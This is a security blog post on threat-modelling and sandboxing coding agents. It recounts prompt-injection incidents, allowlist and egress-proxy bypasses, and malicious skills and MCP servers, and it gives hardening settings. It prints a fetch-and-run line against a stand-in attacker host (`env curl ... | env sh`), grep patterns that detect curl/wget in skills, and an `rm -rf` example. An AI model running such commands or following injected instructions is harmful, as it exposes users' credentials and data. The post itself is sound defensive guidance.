---
title: 'Letting a coding agent run commands without regret'
description: 'A working threat model for coding agents, the sandbox options ranked by real strength, and a graded setup for side projects, work repos and CI.'
pubDate: '2026-08-07'
tags: [llm, coding-agents, security]
---

## The threat model in one paragraph

A coding agent reads text you did not write — repo files, issue bodies, dependency READMEs, web pages, the stdout of whatever it just ran — and it holds real capability: a shell, network access, whatever credentials are in the environment. There is no reliable boundary between "data the agent read" and "instructions the agent follows." That is the whole problem, and it has no prompt-engineering fix.

Simon Willison's [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) names it: access to private data, exposure to untrusted content, ability to communicate externally. Any two are survivable. All three, and exfiltration is one injected sentence away. Meta's [Agents Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/) restates it as policy — at most two per session; need all three, and the agent does not run unsupervised.

Both framings are architectural. You cut a leg or you accept the risk. You do not talk the model out of it.

## Where untrusted text actually enters

Invariant Labs showed a [malicious GitHub issue](https://invariantlabs.ai/blog/mcp-github-vulnerability) driving an agent with a broad PAT to leak private repo contents via an auto-created public PR. The [Clinejection](https://adnanthekhan.com/posts/clinejection/) chain began with an issue *title* interpolated unsanitised into a triage prompt and ended with `VSCE_PAT` and `NPM_RELEASE_TOKEN` leaving a GitHub runner. PromptArmor got Copilot CLI to execute malware from a cloned README because [`env` is classified read-only and auto-approves](https://www.promptarmor.com/resources/github-copilot-cli-downloads-and-executes-malware) — `env curl -s https://attacker/x | env sh` never shows the detector a `curl`. A `.docx` with 1-point white-on-white text made Claude Cowork [upload a user's files](https://www.promptarmor.com/resources/claude-cowork-exfiltrates-files) to an attacker's account.

Note what is missing: model jailbreaks. Anthropic reports Opus 4.7 holding prompt-injection success to ~0.1% on single attempts and 5–6% after a hundred adaptive attempts on Gray Swan. Good numbers, mostly irrelevant here — the payload arrives as ordinary instructions through a trusted channel.

## Permission allowlists are weaker than they look

**Argument-level command allowlists do not work**, and the vendor says so. Anthropic's [permissions docs](https://code.claude.com/docs/en/permissions) call patterns that constrain command arguments "fragile," then list why: `Bash(curl http://github.com/ *)` misses `-X GET`, `https://`, `-L` redirects, `URL=... && curl $URL`, and a double space.

Sharp edges worth knowing:

- Rules evaluate **deny → ask → allow**, first match wins. Specificity does not reorder anything, so a deny rule cannot carry an exception.
- Some wrappers are stripped before matching (`timeout`, `nice`, `nohup`, `xargs`…). Others are not: `npx`, `docker exec`, `devbox run`. So `Bash(devbox run *)` also grants `devbox run rm -rf .`.
- `Bash(ls *)` will not match `lsof`; `Bash(ls*)` will. One space.
- `WebFetch(domain:...)` does not stop network access. If Bash is allowed at all, `curl` reaches anything.

Read the permission system as a **usability and typo layer**, not a security boundary. Anthropic's containment write-up says why: users approved about **93%** of prompts in the initial Claude Code deployment — approval fatigue turns a prompt wall into a click-through EULA. The newer auto mode classifier catches ~83% of overeager actions and blocks only ~0.4% of benign ones, but [Anthropic's own framing](https://www.anthropic.com/engineering/how-we-contain-claude) is that a per-action classifier is not an isolation boundary, and ~17% still gets through.

## The sandbox ladder

| Level | Inside the boundary | Cost to you |
| --- | --- | --- |
| OS sandbox for Bash (`/sandbox`, Codex `workspace-write`) | Bash and its children only | Low. Anthropic measures **84% fewer prompts**; needs `bubblewrap` + `socat` on Linux |
| Whole-process sandbox (`npx @anthropic-ai/sandbox-runtime claude`) | The agent process: file tools, hooks, MCP servers | Medium. Research preview; hand-written allow-lists |
| Dev container, default-deny egress (`init-firewall.sh`, `NET_ADMIN`/`NET_RAW`) | The dev environment | Medium-high. Docker, slower loops, drift |
| VM / microVM, or a hosted agent VM | Full OS | High. Real setup and resource cost |

Two lines from the [sandbox-environments docs](https://code.claude.com/docs/en/sandbox-environments) are easy to skim past. `--dangerously-skip-permissions` must always run inside a container, VM or the sandbox runtime — the Bash sandbox alone "is not sufficient for fully unattended runs." And a dev container is a convention, not an enforcement boundary: with permissions skipped it will not stop a malicious repo exfiltrating `~/.claude`.

The Bash sandbox has a scope hole: **it covers Bash subprocesses, not Read/Edit/Write, not hooks, not MCP servers**. In Microsoft's [CI case study](https://www.microsoft.com/en-us/security/blog/2026/06/05/securing-ci-cd-in-agentic-world-claude-code-github-action-case/), Bash was bubblewrapped with env scrubbing and Read was not, so an injection had it read `/proc/self/environ` and recover the unscrubbed `ANTHROPIC_API_KEY`. Patched in v2.1.128.

## Egress leaks, and is still the leg worth cutting

The [sandboxing reference](https://code.claude.com/docs/en/sandboxing) admits TLS is not terminated by default, so the proxy allowlists on a client-supplied hostname and domain fronting walks past it; broad entries like `github.com` "can create paths for data exfiltration." GitHub's Copilot agent firewall is on by default, and its [docs state](https://docs.github.com/copilot/customizing-copilot/customizing-or-disabling-the-firewall-for-copilot-coding-agent) it does not cover MCP servers or setup steps.

The pattern that keeps recurring: **the allowlisted domain is the exfiltration channel** — `api.anthropic.com` in Cowork, `huggingface.co` in GHSA-fg94-h982-f3mm, GitHub's own API in "Comment and Control". Cut egress anyway. It turns silent theft into an attack that needs a specific, greppable path.

## Secrets: the defaults are not what you want

Under the default Claude Code sandbox, reads cover the whole machine except denied paths — and **`~/.aws/credentials` and `~/.ssh/` are readable by default**. There is no built-in credential deny list; you add one:

```json
{
  "sandbox": {
    "enabled": true,
    "credentials": {
      "files": [
        { "path": "~/.aws/credentials", "mode": "deny" },
        { "path": "~/.ssh", "mode": "deny" }
      ]
    }
  }
}
```

`sandbox.credentials.envVars` also supports `deny` and `mask` (the command sees a sentinel; a proxy substitutes the real value only for listed hosts). `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` strips provider and cloud credentials from every subprocess regardless of sandboxing.

In containers, don't mount `~/.ssh` or cloud credential files; use repo-scoped, short-lived tokens. Anthropic's red team makes the case: a phished employee pasted a malicious prompt themselves, and Claude completed the AWS credential exfiltration **24 times out of 25 retries** — model-layer defences anchor on user intent, and there was nothing anomalous to catch.

## Your agent config is executable code

Treat `.claude/`, `.cursor/`, `SKILL.md` and `.mcp.json` as code that runs, because they are.

Datadog's write-up on [malicious skills](https://securitylabs.datadoghq.com/articles/malicious-skills-supply-chain-risks-in-coding-agents-with-dynamic-context/) is the one to read. Project-level skills load from a repo with no install step, and dynamic context — `` !`cmd` `` inside a SKILL.md — **executes before the model sees anything**, so no model-level refusal can save you. Snyk's [ToxicSkills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/) scan of 3,984 published skills found 1,467 (36.8%) with a security flaw, 534 critical and 76 confirmed malicious payloads. Barrier to publishing: a markdown file and a one-week-old GitHub account.

Two greps for CI:

```bash
grep -rE '!`.*curl|!`.*wget|!`.*bash' .claude/skills/
grep -rE 'allowed-tools:.*Bash\(\*\)' .claude/skills/
```

MCP servers are ordinary npm/PyPI supply chain with agent privileges attached. `postmark-mcp` shipped fifteen clean versions of the official connector, then [added one line in v1.0.16](https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft) BCC'ing every outgoing email to the author. Before installing one that fronts a third-party API, skim the [MCP security spec](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices).

Why it compounds: the Nx [s1ngularity](https://www.wiz.io/blog/s1ngularity-supply-chain-attack) postinstall malware never wrote an exfiltration tool. It invoked the AI CLIs already on the machine with `--dangerously-skip-permissions`, `--yolo` and `--trust-all-tools` and had them do the reconnaissance — over 1,000 valid GitHub tokens, 5,500+ private repos flipped public. Your bypass flag is somebody else's payload.

## A graded setup

| Risk | Mitigation | Cost to you |
| --- | --- | --- |
| Poisoned README leads to a shell command | OS sandbox on for Bash; deny `curl`/`wget`, use domain-scoped fetch | ~10 min; friction with Go CLIs and `docker` |
| Cloud/SSH credentials read off disk | `sandbox.credentials.files` deny + `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` | 5 min; some tools break loudly, which is the point |
| Exfiltration to an arbitrary host | Default-deny egress, package-registry allowlist | Medium; you add domains for a week, then it settles |
| Exfiltration via an *allowlisted* host | Assume it is possible; keep private data out of the session | High — a Rule-of-Two decision, not a config |
| Malicious skill, MCP server or rules file | Review `.claude/**` like code; the greps above; `disableSkillShellExecution` | Low, once it is in CI |
| CI agent on untrusted events | No `allowed_non_write_users: "*"`; explicit `permissions:` block; pin actions to SHAs; no build caches near release secrets | A day of workflow surgery |
| Repo config granting itself privilege | Managed settings: `failIfUnavailable`, `allowUnsandboxedCommands: false` | Org work |

**Personal side project.** Sandbox on, credential deny rules, stop there. Plan or read-only mode for repos you did not write. No bypass mode on your daily driver — that is where your tokens live.

**Work repo.** Default-deny egress plus a whole-process sandbox, so hooks and MCP servers land inside the boundary. Agent config under code review. Managed settings if your org can deliver them — though a Dockerfile-delivered managed-settings file is editable by anyone with repo write access.

**CI.** Highest risk, most casually configured. Every 2026 CI incident shares an anatomy: untrusted event payload, elevated repo token, publish credentials in one runner. Never interpolate issue or PR titles into prompts. Give the agent file reads and minimal `gh` operations — Khan's post-Clinejection advice is no Bash, no Write, no Edit — and use `dontAsk` mode, which exists for this. At Cline, nightly credentials *were* production credentials; keep release secrets in a namespace no agent touches.

## What to change on Monday

1. Turn the OS sandbox on. Cheapest real boundary, and it removes most of the prompts you were rubber-stamping anyway.
2. Add deny rules for `~/.ssh` and cloud credential files. The defaults leave them readable and nobody tells you.
3. Stop writing argument-pattern allowlists for `curl`. Deny the tool and allowlist at the fetch layer instead.
4. Put `.claude/**` and `.mcp.json` behind required review, and run the two skill greps in CI.
5. Before any autonomous run, ask the Rule-of-Two question out loud: untrusted input, sensitive data, external comms — which one am I removing? "None, but the model is good now" is not a design.
